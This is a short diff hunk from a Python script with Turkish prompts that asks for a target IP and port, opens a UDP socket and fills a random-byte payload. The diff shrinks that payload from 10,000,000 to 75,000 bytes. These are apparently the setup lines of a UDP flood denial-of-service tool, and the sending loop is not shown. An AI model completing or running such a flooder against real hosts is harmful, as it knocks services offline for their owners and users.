@@ -15,7 +15,7 @@ print(banner)
 hedef_ip=raw_input("hedef ip: ")
 hedef_port=input("hedef port: ")
 
-bytes=random._urandom(10000000)
+bytes=random._urandom(75000)
 sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
 
 sayac=0
